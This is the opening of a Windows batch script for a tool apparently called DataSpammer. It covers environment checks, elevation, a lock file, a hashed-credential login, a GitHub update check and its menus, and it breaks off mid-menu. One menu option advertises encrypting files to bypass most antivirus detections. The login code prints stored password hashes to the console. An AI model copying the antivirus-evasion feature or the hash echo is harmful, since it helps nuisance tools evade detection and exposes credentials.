:: Use only under License
:: Contribute under https://github.com/PIRANY1/DataSpammer
:: Version v6 - DEVELOPMENT
:: Last edited on 29.06.2025 by PIRANY

:: Some Functions are inspired from the MAS Script. 

:: Short Copy Paste:
:: =============================================================
:: >nul           = hide normal output
:: 2>nul          = hide error output
:: 2>&1           = merge errors into normal output
:: >nul 2>&1      = hide both normal output and errors
:: pushd "path"   = change to directory and remember previous one
:: popd           = go back to previous directory
:: =============================================================

:: =============================================================
:: %~0             = Full path and filename of the batch script
:: %~d0            = Drive letter of the batch script (e.g., D:)
:: %~p0            = Path of the batch script (e.g., \Folder\Subfolder\)
:: %~n0            = Name of the batch script without extension (e.g., script)
:: %~x0            = File extension of the batch script (e.g., .bat)
:: %~dp0           = Drive and path only (e.g., D:\Folder\Subfolder\)
:: %~nx0           = Filename and extension only (e.g., script.bat)
:: =============================================================

:: =============================================================
:: %~f1            = Full path of argument 1
:: %~d1            = Drive Letter of argument 1
:: %~p1            = Path without Drive Letter of argument 1
:: %~n1            = Filename without extension of argument 1
:: %~x1            = File extension of argument 1
:: %~s1            = Path in short 8.3 format of argument 1
:: %~a1            = File attributes of argument 1
:: %~t1            = Timestamp of argument 1
:: %~z1            = Size of argument 1

:: Example:
:: echo File "%~n1%~x1" is %~z1 bytes and last modified %~t1
:: =============================================================

:: =============================================================
:: for %%A in (*.txt) do echo %%A = loop through all .txt files
:: for /r %%A in (*) do echo %%A = loop recursively through folders
:: echo %var:~0,2% = prints first 2 characters ("he")
:: echo %var:~-2%  = prints last 2 characters ("lo")
:: echo %var:hello=hi%  = replaces "hello" with "hi"
:: %1 %2 %3 ... = First, second, third argument etc.
:: %* = All arguments as a single string
:: Detect if file is locked
:: rename file.txt file.locked >nul 2>&1 || echo File is locked
:: Output 32bit or 64bit
:: echo %PROCESSOR_ARCHITECTURE%
:: Escape special characters
:: ^ = escape symbol (e.g., echo 5^>3 shows "5>3" instead of redirecting)
:: Full random numbers
:: call :generateRandom
:: echo %realrandom%
:: set /p firstLine=<
:: =============================================================

:: =============================================================
:: Settings:
:: Default Filename: default_filename = (Filename)
:: Developermode: developermode = (0/1)
:: Change Monitoring Socket: monitoring = (0/1)
:: Change Color: color = (Color Syntax)
:: Skip Security Question: skip-sec = (0/1)
:: Custom Codepage: chcp = (Codepage)
:: Logging: logging = (0/1/2)
:: Elevation: elevation = (pwsh/gsudo/sudo/off)
:: =============================================================


:: Release Checklist:
::      - Add README, LICENSE & dataspammer.bat to Release
::      - Add Version to Release
::      - Remove development Flags
::      - Remove Debugging Flags
::      - Add new Script Version Number to dataspammer.bat

:: Todo: 
::      Add more Comments, Logs , Socket Messages, Error Checks and Color
::      Implement echo Verbose Message >%destination% %cls.debug%
::      Add more Emojis (emoji_info=ℹ️, emoji_warning=⚠️, emoji_error=❌, emoji_okay=✅)

::      Fix Updater - Clueless After 3 Gazillion Updates - Hopefully Fixed
::      Add Enviroment Simulator Script for Testing.
::      Replace . & - with _ in Variables & Labels
::      Verify CIF Parser
::      Finish DE Translation

::      V6 Stuff:
::      Integrate DE Version
::      Verify Basis Functions & Custom Dir Install
::      Check New Download Logic, and new URLs
::      Add more Emojis
::      Check Color Keeping after :color
::      Add all Reg Settings to spam.settings

:top
    @echo off
    @cls
    @pushd "%~dp0"
    @title DataSpammer - Initiating
    @echo Initializing...
    @setlocal ENABLEDELAYEDEXPANSION

    :: Improve NT Compatabilty - Made by Gradlew
    if "%OS%"=="Windows_NT" setlocal
    set "DIRNAME=%~dp0"
    if "%DIRNAME%"=="" set DIRNAME=.

    :: Set Window Size
    mode con: cols=120 lines=35

    :: Development / Production Flag
    set "current_script_version=development"

    set "cls.debug=cls"

    set "exec-dir=%~dp0"

    :: Can be Implemented along if errorlevel ...
    set "errormsg=echo: &call :color _Red "====== ERROR ======" &echo:"
    
    :: Predefine _erl to ensure errorlevel or choice inputs function correctly
    set "_erl=FFFF"

    :: Allows ASCII stuff without Codepage Settings - Not My Work - Credits to ?
    :: Properly Escape Symbols like | ! & ^ > < etc. when using echo (%$Echo% " Text)
    SET $Echo=FOR %%I IN (1 2) DO IF %%I==2 (SETLOCAL EnableDelayedExpansion ^& FOR %%A IN (^^^!Text:""^^^^^=^^^^^"^^^!) DO ENDLOCAL ^& ENDLOCAL ^& ECHO %%~A) ELSE SETLOCAL DisableDelayedExpansion ^& SET Text=

    :: Check for NCS Support
    :: NCS is required for ANSI / Color Support
    call :check_NCS
    if "%_NCS%"=="1" ( 
        call :color _Green "ANSI Color Support is enabled" okay
    ) else (
        echo ANSI Color Support is not enabled.
    )

    :: Parse Correct Timeout & Ping Locations otherwise WOW64 May cause issues.
    for /f "delims=" %%P in ('where ping.exe 2^>nul') do set "ping=%%P"
    if not defined PING (
        %errormsg%
        call :color _Red "Ping is not found." error
        call :color _Red "Please verify that PING is available in your PATH." error
        call :sys.lt 10 count
        goto cancel
    ) else (
        call :color _Green "Ping found at: !PING!" okay
    )
    
    for /f "delims=" %%T in ('where timeout.exe 2^>nul') do set "timeout=%%T"
    if not defined TIMEOUT (
        %errormsg%
        call :color _Red "Timeout is not found." error
        call :color _Red "Please verify that TIMEOUT is available in your PATH." error
        call :sys.lt 10 count
        goto cancel
    ) else (
        call :color _Green "Timeout found at: !TIMEOUT!" okay
    )

    :: Set CMD Path based on Context - 64bit or 32bit
    set "cmdPath=%ComSpec%"

    :: No Dependency Functions (Arguments) - Documented at help.startup
    if "%~1"=="version" title DataSpammer && goto version
    if "%~1"=="--help" title DataSpammer && goto help.startup
    if "%~1"=="help" title DataSpammer && goto help.startup

    :: Check if Script is running from Temp Folder
    if /I "%~dp0"=="%TEMP%" (
        %cls.debug%
        %errormsg%
        call :color _Red "The script was launched from the temp folder." error
        call :color _Yellow "You are most likely running the script directly from the archive file." warning
        call :sys.lt 10 count
        goto cancel
    )
    
    :: Check if Script is running from Network Drive
    if /I "%~d0"=="\\\\" (
        %errormsg%
        call :color _Red "The script was launched from a network drive." error
        call :color _Yellow "Installation may not work properly." warning
        call :sys.lt 10 count
    )

    :: Check if Script is running from a UNC Path
    if /I "%~d0"=="\\" (
        %errormsg%
        call :color _Red "The script was launched from a UNC path." error
        call :color _Yellow "Installation may not work properly." warning
        call :sys.lt 10 count
    )

    :: Check Windows Version - Win 10 & 11 have certutil and other commands needed. Win 8.1 and below not have them
    call :win.version.check
    for /f "tokens=2 delims=[]" %%a in ('ver') do set "ver_full=%%a"
    for /f "tokens=1-4 delims=." %%a in ("%ver_full%") do (
        set "ver_major=%%a"
        set "ver_minor=%%b"
        set "ver=%%a.%%b"
    )

    :: Compare
    if "%ver%" == "6.1" set "winver=7"
    if "%ver%" == "6.2" set "winver=8"
    if "%ver%" == "6.3" set "winver=8.1"

    if defined winver (
        %cls.debug%
        %errormsg%
        echo Detected Windows %winver%
        call :color _Yellow "Warning: Some features may not work on this version." warning
        call :color _Red "For full compatibility, please update to Windows 10 or 11." error
        call :color _Yellow "Note: certutil and other tools may be missing on older Windows versions." warning
        call :sys.lt 10 count
    ) else (
        call :color _Green "Windows Version is sufficient: %ver_full%" okay
    )    


    :: Parse Powershell Location
    for /f "tokens=* delims=" %%O in ('where powershell') do (
        set "line_powershell=%%O"
        for /f "tokens=* delims=" %%A in ("!line_powershell!") do set "powershell_location=%%A"
    )
    if not defined powershell_location (
        %errormsg%
        call :color _Red "Powershell is not found." error
        call :color _Red "Please verify that Powershell is installed & available in your PATH." error
        call :sys.lt 10 count
        goto cancel
    ) else (
        call :color _Green "Powershell found at: !powershell_location!" okay
    )
    set "powershell_short=%powershell_location% -ExecutionPolicy Bypass -NoProfile -NoLogo"
    set "powershell_short_alternative=powershell -ExecutionPolicy Bypass -NoProfile -NoLogo"

    :: Check if Powershell is over version 4
    for /f "delims=." %%V in ('%powershell_short_alternative% "$PSVersionTable.PSVersion.Major"') do set "PS_MAJOR=%%V"
    if !PS_MAJOR! LSS 4 (
        %errormsg%
        call :color _Red "PowerShell version is too old." error
        call :color _Red "Current version: !PS_MAJOR!.x" error
        call :color _Yellow "Please update Powershell to at least version 4." warning
        call :sys.lt 6 count
        goto cancel
    ) else (
        call :color _Green "Powershell Version is sufficient: !PS_MAJOR!.x" okay
    )

    :: Check for Line Issues
    findstr /v "$" "%~nx0" >nul
    if errorlevel 1 (
        call :color _Green "Line endings are correct." okay
    ) else (
        %errormsg%
        call :color _Red "Script either has LF line ending issue or an empty line at the end of the script is missing. " error 
        call :sys.lt 20 count
        goto cancel
    )

    :: Check if Null Kernel Service is running
    sc query Null | find /i "RUNNING" >nul
    if %errorlevel% NEQ 0 (
        %errormsg%
        call :color _Red "Null Kernel service is not running, script may crash. " error
        call :sys.lt 20 count
    ) else (
        call :color _Green "Null Kernel service is running." okay
    )

    :: If no arguments are given, start the script normally
    if "%~1"=="" goto startup

    :: Check for /b or /v
    for %%A in (%1 %2 %3 %4 %5) do (
        if /I "%%~A"=="/b" (
            set "b.flag=/b "
        )
        if /I "%%~A"=="/v" (
            set "verbose=1"
        )
        if /I "%%~A"=="/unsecure" (
            set "unsecure=1"
        )
    )

    :: Regular Argument Checks - Documented at help.startup
    if "%~1"=="faststart" title DataSpammer && goto sys.enable.ascii.tweak
    if "%~1"=="update" title DataSpammer && goto fast.git.update
    if "%~1"=="update.script" title DataSpammer && call :update.script "%~2" && goto cancel
    if "%~1"=="remove" title DataSpammer && goto sys.delete.script
    if "%~1"=="debug" title DataSpammer && goto debuglog
    if "%~1"=="debugtest" title DataSpammer && goto debugtest
    if "%~1"=="monitor" title DataSpammer && goto monitor
    if "%~1"=="start" title DataSpammer && goto start.verified
    if "%~1"=="install" title DataSpammer && goto installer.main.window
    
    :: Check if Argument is a Path, then execute it as CIF
    if /i "%~x1"==".dts" goto custom.instruction.read

    :: Undocumented Arguments
    if "%~1"=="update-install" ( goto sys.new.update.installed )
    if "%~1"=="ifp.install" ( goto ifp.install )

:startup
    :: Check for Install Reg Key
    reg query "HKCU\Software\DataSpammer" /v Installed >nul 2>&1
    if %errorlevel% neq 0 (
        call :color _Red "Installation was not executed." error
        call :color _Green "Opening installer..." okay
        goto installer.main.window
    )

    :: Check for Install Reg Key
    for /f "tokens=1,2,*" %%a in ('reg query "HKCU\Software\DataSpammer" /v Version ^| find "Version"') do (
      set "reg_version=%%c"
    ) >nul
    
    :: If no Reg Key is found, port to v6
    if not defined reg_version (
        goto v6.port
    )
    
    :: Check if RegKey is outdated
    if not "%reg_version%"=="%current_script_version%" (
        call :color _Red "Script Version Registry Key is outdated." error
        choice /C YN /M "Do you want to update the Registry Key? (Y/N)"
        set "_erl=%errorlevel%"
        if "%_erl%"=="1" ( goto sys.new.update.installed )
    )

    :: Parse Config
    call :parse.settings

    :: Apply Custom Codepage if defined
    if chcp neq 0 (
        chcp %chcp% >nul
        call :color _Green "Codepage set to %chcp%" okay
    )

    if "%chcp%"=="65001" (
        call :color _Green "Enabled Emoji Support" okay
    ) else (
        call :color _Green "Codepage is not set to 65001, disabling Emoji Support" error
    )

    :: Check if Verbose is enabled
    if "%verbose%"=="1" (
        call :color _Green "Verbose Output is Disabled" okay
        set "destination=CON"
        set "cls.debug=echo: "
    ) else (
        call :color _Green "Verbose Output is Enabled" okay
        set "destination=nul"
        set "cls.debug=cls"
    )
    :: Be Extra Safe
    if not defined destination ( set "destination=nul")

    :: Apply Color from Settings
    if defined color ( color %color% >nul ) else ( color 0F >nul )

    :: Check if Terminal is installed
    for /f "delims=" %%a in ('where wt') do (
        set "WT_PATH=%%a"
    )
    if not defined WT_PATH (
        call :color _Red "wt.exe not found in PATH." error
        call :color _Yellow "Falling back to cmd.exe" warning
        set "elevPath=cmd.exe"
    ) else (
        call :color _Green "wt.exe found at: !WT_PATH!" okay
        set "elevPath=wt"
    )


    :: Elevate Script with sudo, gsudo or powershell
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        if "%elevation%"=="sudo" (
            for /f "delims=" %%A in ('where sudo') do set SUDO_PATH=%%A
            %SUDO_PATH% --new-window -- "%LocalAppData%\Microsoft\WindowsApps\wt.exe" %cmdPath% /c ""%~f0" %b.flag%%v.flag%" || goto elevation_failed
            goto cancel
        )
        if "%elevation%"=="gsudo" (
            for /f "delims=" %%A in ('where gsudo') do set GSUDO_PATH=%%A
            %GSUDO_PATH% --new "%LocalAppData%\Microsoft\WindowsApps\wt.exe" %cmdPath% /c ""%~f0" %b.flag%%v.flag%" || goto elevation_failed
            goto cancel
        )
        if "%elevation%"=="pwsh" (
            %powershell_short% -Command "Start-Process '%elevPath%' -ArgumentList 'cmd.exe /c ""%~f0"" %b.flag%%v.flag%' -Verb RunAs" || goto elevation_failed
            goto cancel
        )
        if "%elevation%"=="off" (
            call :color _Green "Elevation is disabled." okay
        ) else (
            %errormsg%
            call :color _Red "Error while trying to elevate script." error
            call :color _Yellow "Please run the script manually as Administrator." warning
            pause
            goto cancel
        )
    )
    call :color _Green "Elevation successful." okay
    cd /d "%~dp0"

    if defined PROCESSOR_ARCHITEW6432 (
        %errormsg%
        call :color _Red "Running as 32-Bit on 64-Bit Windows" error
        call :color _Yellow "Relaunching as 64-Bit..." warning
        start %elevPath% cmd.exe /c "%~f0" %b.flag%%v.flag%
        call :sys.lt 5 count
        goto cancel
    ) else (
        call :color _Green "Running on 64-Bit Windows" okay
    )

    :: Check if Temp Folder is writable
    call :rw.check "%temp%"
    if "%errorlevel%"=="1" (
        %errormsg%
        call :color _Red "Temp Folder is not writable." error
        call :color _Yellow "Script may not work properly." warning
        call :sys.lt 10 count
    ) else (
        call :color _Green "Temp Folder is writable." okay
    )

    :: Check if local dir is writable
    call :rw.check "%exec-dir%"
    if "%errorlevel%"=="1" (
        %errormsg%
        call :color _Red "Local Directory is not writable." error
        call :color _Yellow "Script may not work properly." warning
        call :sys.lt 10 count
    ) else (
        call :color _Green "Local Directory is writable." okay
    )
    goto pid.check
    
:elevation_failed
    %errormsg%
    call :color _Red "Failed to elevate script." error
    call :color _Yellow "Please run the script manually as Administrator." warning
    echo :color _Yellow "Exiting in 5 Seconds " warning
    call :sys.lt 5 count
    goto cancel

:pid.check
    :: Get the Parent Process ID of the current script - Needed for Monitor & Lock
    %powershell_short% -Command "(Get-CimInstance Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId" > "%temp%\parent_pid.txt"

    :: Parse Parent PID Content & if empty set to 0000
    if exist "%temp%\parent_pid.txt" ( set /p PID=<"%temp%\parent_pid.txt" ) else ( set "PID=0000" && %errormsg% && call :color _Red "Failed to get Parent PID" && call :sys.lt 4 count) 
    
    :: If PID is empty, set to 0000
    if "%PID%"=="" ( set "PID=0000" && %errormsg% && call :color _Red "Failed to Parse Parent PID" error && call :sys.lt 4 count)
    del "%temp%\parent_pid.txt" >nul
    call :color _Green "Got PID: %PID%" okay

    :: Allow Better Readability
    if "%logging%"=="1" (
        call :log . INFO
        call :log =================== INFO
        call :log DataSpammer_Startup INFO
        call :log Current_PID:_%PID% INFO
        call :log =================== INFO
        call :log . INFO
    )

    :: If lockfile exists, extract PID 
    if exist "%~dp0\dataspammer.lock" (
        set "pidlock="
        for /f "usebackq delims=" %%L in ("%~dp0\dataspammer.lock") do set "pidlock=%%L"
    ) else (
        if "%logging%"=="1" call :log No_Lock_Exists INFO
        goto lock.create
    )

    :: Remove spaces from Variables
    set "PID=!PID: =!"
    set "pidlock=!pidlock: =!"

    if "%logging%"=="1" call :log PID-Check_Results:PID:!PID!_PIDlock:!pidlock! INFO
    
    echo PID: %pid% >%destination%
    echo Lock PID: %pidlock% >%destination%

    :: If Lock could be parsed check if process is running
    if defined pidlock (
        tasklist /FI "PID eq !pidlock!" | findstr /i "!pidlock!" >nul
        if !errorlevel! == 0 (
            :: process is already running under pidlock, exit
            call :color _Red "DataSpammer is already running under PID !pidlock!." error
            if !logging! == 1 call :log DataSpammer_Already_Running ERROR
            echo Exiting...
            pause
            goto cancel
        ) else (
            call :color _Red "DataSpammer may have crashed or was closed. Deleting lock file..." error
            call :color _Red "Be aware that some tasks may not have finished properly." error
            if !logging! == 1 call :log DataSpammer_may_have_crashed ERROR
            del "%~dp0\dataspammer.lock" >nul 2>&1
            timeout /t 5 /nobreak >nul
        )
    ) else (
        :: No PID found in lock file. Delete it 
        call :color _Yellow "No PID Found - Deleting Lock..." warning
        if %logging% == 1 ( call :log PID_Empty ERROR )
        del "%~dp0\dataspammer.lock" >nul
    )

    :lock.create
    :: Create a new lock & write current PID to it
    > "%~dp0\dataspammer.lock" echo %PID%
    if "%errorlevel%"=="1" ( %errormsg% && call :color _Red "Failed to create lock file." error && call :sys.lt 6 count )

    :: Start the Monitor Socket
    if "%monitoring%"=="1" (
        start /min %cmdPath% /k ""%~f0" monitor %PID%" 
        if %logging% == 1 ( call :log Starting_Monitor_Socket INFO )
        >> "%TEMP%\socket.con" echo Connection Request from %PID%
    )

    :: Check if Login is Setup
    reg query "HKCU\Software\DataSpammer" /v UsernameHash >nul 2>&1 || goto file.check

:login.input
    if %logging% == 1 ( call :log Starting_Login INFO )
    %cls.debug% && title DataSpammer - Login

    :: Username and Password Input
    set /p "username.script=Please enter your Username: "
    set "username.script=%username.script: =%"
    :: Check if the input is a SHA256 hash (64 hex chars)
    for /f "delims=" %%h in ('%powershell_short% -Command "if ('%username.script%' -match '^[a-fA-F0-9]{64}$') { Write-Output 'HASH' }"') do set "is_hash=%%h"
    if /i "%is_hash%"=="HASH" (
        echo You entered a SHA256 hash as username.
        echo This is not allowed, please enter a normal username.
        if %logging% == 1 ( call :log Username_Is_Hash ERROR )
        pause
        goto login.input
    )

    for /f "delims=" %%a in ('%powershell_short% -Command "$pass = Read-Host 'Please enter your Password' -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))"') do set "password=%%a"
    
    :: Check if the input is a SHA256 hash (64 hex chars)
    for /f "delims=" %%h in ('%powershell_short% -Command "if ('%password%' -match '^[a-fA-F0-9]{64}$') { Write-Output 'HASH' }"') do set "is_hash=%%h"
    if /i "%is_hash%"=="HASH" (
        echo You entered a SHA256 hash as Password.
        echo This is not allowed, please enter a normal password.
        if %logging% == 1 ( call :log Password_Is_Hash ERROR )
        pause
        goto login.input
    )

    :: Convert Username and Password to Hash
    echo Converting to Hash...

    set "pscmd= $input = '%username.script%'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($input); $sha = [System.Security.Cryptography.SHA256]::Create(); $hash = $sha.ComputeHash($bytes); ($hash | ForEach-Object { $_.ToString('x2') }) -join ''"
    for /f "usebackq delims=" %%a in (`%powershell_short% -Command "%pscmd%"`) do set "username_hash=%%a"


    set "pscmd= $input = '%password%'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($input); $sha = [System.Security.Cryptography.SHA256]::Create(); $hash = $sha.ComputeHash($bytes); ($hash | ForEach-Object { $_.ToString('x2') }) -join ''"
    for /f "usebackq delims=" %%a in (`%powershell_short% -Command "%pscmd%"`) do set "password_hash=%%a"

    :: Extract Stored Username and Password
    echo Extracting Hash from Registry...
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v UsernameHash 2^>nul') do set "stored_username_hash=%%A"
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v PasswordHash 2^>nul') do set "stored_password_hash=%%A"

    echo Calc Username: "%username_hash%"  Stored Username: "%stored_username_hash%"
    echo Calc Password: "%password_hash%"  Stored Password: "%stored_password_hash%"
    pause
    :: >%destination%

    :: Remove Whitespaces
    set "username_hash=%username_hash: =%"
    set "stored_username_hash=%stored_username_hash: =%"
    set "password_hash=%password_hash: =%"
    set "stored_password_hash=%stored_password_hash: =%"
    :: Compare Hashes
    echo Comparing Hashes...
    if "%username_hash%" EQU "%stored_username_hash%" (
        echo Username Matches
        if "%password_hash%" EQU "%stored_password_hash%" (
            echo Password Matches
            goto file.check
        ) else (
            echo Authentication failed. Password does not match.
            if %logging% == 1 ( call :log Password_Not_Matching WARN )
            echo Credentials do not match!
            pause
            goto login.input
        )
    ) else (
        echo Authentication failed. Username does not match.
        echo Credentials do not match!
        if %logging% == 1 ( call :log Username_Not_Matching WARN )
        pause
        goto login.input
    )    


:file.check
    title DataSpammer - Starting
    :: Establish Socket Connection
    call :send_message Started DataSpammer
    call :send_message Established Socket Connection
    if %logging% == 1 ( call :log Established_Socket_Connection INFO )
    if %logging% == 1 ( call :log Checking_Settings_for_Update_Command INFO )

    :: Start Update Check
    call :gitcall.sys
    goto dts.startup.done

:gitcall.sys
    :: Update Function Logic
    if %logging% == 1 ( call :log Calling_Update_Check INFO )
    :: If Script is in Development Mode, skip the update check
    if "%current_script_version%"=="development" (
        call :color _Green "Development Version, Skipping Update" okay
        call :sys.lt 5
        if "%logging%"=="1" ( call :log Skipped_Update_Check_%current_script_version%_Development_Version WARN )
        exit /b 0
    )
    call :git.version.check
    if "%uptodate%"=="up" ( call :git.version.clean ) else ( call :git.version.outdated )
    exit /b

:git.version.check
    :: Curl GitHub API, extract latest version & compare with current script version
    if %logging% == 1 ( call :log Curling_Github_API INFO )
    echo Checking for Updates...
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    echo Got Release Info...
    echo Extracting Data...
    call :sys.lt 2
    :: Extract Tag Name from JSON Response
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    :: Compare latest version with current script version
    set "latest_version=%latest_version:"=%"
    if "%latest_version%" equ "v6" ( set "uptodate=up" ) else ( set "uptodate=%current_script_version%" )
    if %logging% == 1 ( call :log %latest_version%=v6 INFO )
    del apianswer.txt
    exit /b
    
:git.version.clean
    if %logging% == 1 ( call :log Version_Is_Up_To_Date INFO )
    echo The Version you are currently using is the newest one (%latest_version%)
    call :sys.lt 1
    exit /b

:git.version.outdated
    if %logging% == 1 ( call :log Version_Outdated WARN )
    echo Version Outdated ^!
    call :sys.lt 1
    echo The Version you are currently using is %current_script_version%
    call :sys.lt 1
    echo The newest Version avaiable is %latest_version%
    call :sys.lt 1
    echo:
    echo [1] Update
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Continue Anyways
    call :sys.lt 1
    echo:
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 call :update.script stable && exit
        if %_erl%==2 exit /b
    goto git.version.outdated

:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: -------------------------------------------------Start.bat  <- Transition -> DataSpammer.bat------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:dts.startup.done
    :: Create Event Log Entry
    EVENTCREATE /T INFORMATION /ID 100 /L APPLICATION /SO DataSpammer /D "Successfully started DataSpammer-%current_script_version% %errorlevel%" >nul

    :: Compare Hash
    call :dataspammer.hash.check

    title DataSpammer - Finishing Startup

    :: Check if DataSpammer.log is larger than 1MB
    if exist "%userprofile%\Documents\DataSpammerLog\DataSpammer.log" (
        for %%A in ("%userprofile%\Documents\DataSpammerLog\DataSpammer.log") do (
            if %%~zA GTR 1048576 (
                echo DataSpammer.log is larger than 1MB. Renaming to DataSpammer.log.old.
                ren "%userprofile%\Documents\DataSpammerLog\DataSpammer.log" "DataSpammer.log.old"
            )
        )
    )
    :: Remove encrypt File from Installer
    if exist "%~dp0\encrypt.bat" erase "%~dp0\encrypt.bat" >nul 2>&1

    :: Check Developermode
    if "%developermode%"=="1" ( set "dev-mode=1" & echo Enabled Developermode ) else ( set "dev-mode=0" )

    :: Extract CMD Version
    for /f "tokens=2 delims=[]" %%v in ('ver') do set CMD_VERSION=%%v

    :: Logging
    if %logging% == 1 ( call :log Startup_Complete INFO )
    if %logging% == 1 ( call :log Successfully_Started_DataSpammer_%current_script_version%_Errorlevel:_%errorlevel% INFO )

    :: Set Username for Menu
    if not defined username.script set "username.script=%username%"

:menu
    if defined color (
        color %color% >nul
    ) else (
        color 0F >nul
    )
    cd /d "%~dp0"
    if %logging% == 1 ( call :log Displaying_Menu INFO )
    title DataSpammer %current_script_version% - Menu - Development
    %cls.debug%

    %$Echo% "   ____        _        ____
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|
    %$Echo% "                             |_|


    call :sys.lt 1
    echo Made by PIRANY - %current_script_version% - Logged in as %username.script% - CMD-Version %CMD_VERSION%
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Start
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Settings
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Desktop Icon
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Open GitHub-Repo
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Cancel
    echo:
    echo:
    choice /C 12345S /T 120 /D S /M "Choose an Option from Above: "
        set _erl=%errorlevel%
        if %_erl%==1 goto start
        if %_erl%==2 goto settings
        if %_erl%==3 goto desktop.settings
        if %_erl%==4 explorer https://github.com/PIRANY1/DataSpammer && %cls.debug% && goto menu
        if %_erl%==5 goto cancel
        if %_erl%==6 call :standby
    goto menu

:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: ------------------------------------------------- Settings Start ---------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------



:settings
    if %logging% == 1 ( call :log Opened_Settings_%dev-mode%_dev_mode INFO )
    color
    %cls.debug% 
    %$Echo% "    ____       _   _   _ 
    %$Echo% "   / ___|  ___| |_| |_(_)_ __   __ _ ___
    %$Echo% "   \___ \ / _ \ __| __| | '_ \ / _` / __|
    %$Echo% "    ___) |  __/ |_| |_| | | | | (_| \__ \
    %$Echo% "   |____/ \___|\__|\__|_|_| |_|\__, |___/
    %$Echo% "                               |___/

    echo:
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    call :color _White "[1] Spam Settings"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Red "[2] Developer Options"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Yellow "[3] Version Control"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Blue "[4] Account"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Green "[5] Restart Script"
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    call :color _Red "[6] Advanced Options"    
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [7] Go back
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo:
    call :sys.lt 1

    choice /C 1234567S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto spam.settings
        if %_erl%==2 goto activate.dev.options
        if %_erl%==3 goto settings.version.control
        if %_erl%==4 goto login.setup
        if %_erl%==5 goto restart.script
        if %_erl%==6 goto advanced.options
        if %_erl%==7 goto menu
        if %_erl%==8 call :standby
    goto settings


:advanced.options
    echo [1] Switch Elevation Method (pswh / sudo / gsudo)
    call :sys.lt 1
    echo [2] Encrypt Files (Bypass most Antivirus detections)
    call :sys.lt 1
    echo [3] Verbose Output
    call :sys.lt 1
    echo [4] Logging
    call :sys.lt 1
    echo [5] Monitor
    call :sys.lt 1
    echo [6] Change Color
    call :sys.lt 1
    echo [7] Change Codepage ( Emoji Support^! )
    call :sys.lt 1
    echo [8] Download Wait.exe - Improve Speed / Wait Time - Source is at PIRANY1/wait.exe (ALPHA)
    call :sys.lt 1
    echo [9] Enable Custom Instruction File (Experimental)
    call :sys.lt 1
    echo [U] Uninstall
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [C] Go back
    choice /C 123456789UCS /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto switch.elevation
        if %_erl%==2 goto encrypt
        if %_erl%==3 goto verbose.output.settings
        if %_erl%==4 goto settings.logging
        if %_erl%==5 goto monitor.settings
        if %_erl%==6 goto change.color
        if %_erl%==7 goto change.chcp
        if %_erl%==8 goto download.wait
        if %_erl%==9 goto custom.instruction.enable
        if %_erl%==10 goto sys.delete.script
        if %_erl%==11 goto settings
        if %_erl%==12 call :standby
    goto advanced.options

:verbose.output.settings
    if "%verbose%"=="1" set "verbose.status=Enabled"
    if "%verbose%"=="0" set "verbose.status=Disabled"
    echo -----------------------
    echo Verbose Output Settings
    echo -----------------------

    echo:
    echo Verbose Output is currently %verbose.status%
    echo:
    echo [1] Enable Verbose Output
    call :sys.lt 1
    echo [2] Disable Verbose Output
    call :sys.lt 1
    echo [3] Go back
    echo:
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto verbose.enable
        if %_erl%==2 goto verbose.disable
